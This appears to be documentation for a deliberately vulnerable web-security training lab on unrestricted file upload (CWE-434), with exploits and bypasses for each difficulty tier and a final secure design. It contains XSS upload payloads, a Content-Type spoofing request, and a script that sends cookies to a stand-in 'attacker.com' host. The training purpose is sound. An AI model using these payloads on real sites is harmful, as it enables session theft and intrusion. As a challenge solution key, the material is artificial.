# File Upload

OWASP: https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/
CWE: CWE-434

Unrestricted file upload allows attackers to upload executable files (web shells, HTML with scripts, SVG with embedded JavaScript) to a web-accessible directory. When the server serves these files directly, they execute in the context of the application's origin.

---

## Ship to Production Friday (`upload_webshell`)

**Difficulty:** Junior
**CWE:** CWE-434
**Route:** `POST /challenges/upload`

### Intern Tier

**Vulnerability:** No validation of file type, extension, size, or content. Files are saved with their original filename to `/static/uploads/`, which is directly web-accessible. Path traversal is possible through filenames containing `../`.

**Exploit:**

1. Navigate to `/challenges/upload`
2. Upload a file named `shell.html` with the following content:

```html
<script>alert('webshell')</script>
```

3. The file is saved to `/static/uploads/shell.html`
4. Access the uploaded file directly in the browser: `GET /static/uploads/shell.html`
5. The JavaScript executes in the application's origin.

**Solve condition:** The challenge solves when the upload succeeds and the file extension is one of: `.html`, `.htm`, `.svg`, `.py`, `.php`, `.phtml`, `.js`, `.sh`, or the filename contains `.py.` (double extension).

**Why it works:** Without extension validation, any dangerous file type can be uploaded. HTML and SVG files stored in a web-accessible directory are rendered and executed by the browser, giving the attacker full script access to the application's cookies and DOM. Script-language files like `.py` and `.php` would execute server-side on servers configured to run them; on this static file server they display as text, but their presence in the webroot is still a configuration failure.

### Junior Tier

**What changed:** An extension blacklist blocks: `.py`, `.php`, `.exe`, `.sh`, `.bat`, `.cmd`, `.ps1`. Client-side size validation (no server-side enforcement). Original filename retained.

**Bypass:** The blacklist misses dangerous extensions including `.html`, `.svg`, `.phtml`, and double extensions like `.py.jpg`.

**Exploit:**

Upload `shell.html`:

```html
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

or upload `shell.svg`:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
</svg>
```

or use a double extension: `shell.py.jpg`

### Senior Tier

**What changed:** Extension allowlist (`.jpg`, `.jpeg`, `.png`, `.gif`, `.pdf`, `.txt`), MIME type validation, UUID-based filenames (prevents path traversal), 5MB size limit. Files still stored in `/static/uploads/`.

**Bypass:** The MIME type is read from the `Content-Type` header, which is client-controlled. An attacker can upload a `.html` file with `Content-Type: image/jpeg`.

**Exploit:**

```
POST /challenges/upload
Content-Type: multipart/form-data

------boundary
Content-Disposition: form-data; name="file"; filename="exploit.txt"
Content-Type: text/plain

<script>alert('XSS')</script>
------boundary--
```

The `.txt` extension passes the allowlist. When served, some browsers may sniff the content and render it as HTML. Alternatively, craft a polyglot file that passes extension validation but contains executable content.

### Tech Lead Tier

**Defense:** Extension allowlist (`.jpg`, `.jpeg`, `.png`, `.gif`, `.pdf`, `.txt`). Magic byte validation checks actual file content signatures (JPEG `ff d8 ff`, PNG `89 50 4e 47`, GIF87a/GIF89a, PDF `%PDF`). UUID filenames. Files stored outside the webroot at `/data/uploads/` (not directly accessible). 2MB size limit.

**Why it works:** Magic byte validation ensures the file content matches its claimed type, preventing Content-Type spoofing. Storing files outside the webroot means they cannot be accessed directly via URL. Even if an attacker bypasses extension checks, the file cannot be served to execute in a browser context. This addresses CWE-434 through defense-in-depth: input validation, content verification, and secure storage.
